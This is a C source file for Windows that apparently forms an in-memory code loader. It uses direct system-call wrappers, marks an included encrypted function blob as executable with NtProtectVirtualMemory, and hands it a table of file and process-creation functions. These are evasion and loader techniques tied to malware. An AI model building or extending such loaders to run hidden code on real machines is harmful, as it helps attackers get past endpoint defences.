#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
#include "fun.h"

void entry(main_funs_t* f);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags // Pass RTL_USER_PROCESS_PARAMETERS_NORMALIZED to keep parameters normalized
);

NTSTATUS NTAPI sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
NTSTATUS NTAPI sys_NtCreateFile(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
NTSTATUS NTAPI sys_NtReadFile(HANDLE,HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,PLARGE_INTEGER,PULONG);
void sys_uni();

//char buf[] = {0x90, 0x90, 0x90, 0x90, 0xC3};

uint8_t loader[] = 
#include "loader.h"
;

uint8_t main_fun[] = 
#include "encfun/main.h"
;

int main(int argc, char *argv[]) {
	void *bufAddr = &main_fun;
	SIZE_T nBytes = sizeof(main_fun);
	DWORD oldProt = 0;
	main_funs_t main_funs;


	printf("BaseAddress - %p\nNumberOfBytes - %u\nOldProt - %x\n------------------\n", bufAddr, nBytes, oldProt);
	printf("%x", sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt));
	printf("\n------------------\nBaseAddress - %p\nNumberOfBytes - %u\nOldProt - %x\n", bufAddr, nBytes, oldProt);


	main_funs.NtCreateFile = sys_NtCreateFile;
	main_funs.NtReadFile = sys_NtReadFile;
	main_funs.GetProcessHeap = GetProcessHeap;
	main_funs.RtlAllocateHeap = RtlAllocateHeap;
	main_funs.RtlInitUnicodeString = RtlInitUnicodeString;
	main_funs.RtlCreateProcessParametersEx = RtlCreateProcessParametersEx;
	main_funs.sys_uni = sys_uni;
	main_funs.loader = loader;

	//(*(void(*)(main_funs_t*))main_fun)(&main_funs);
	entry(&main_funs);

	return 0;
}
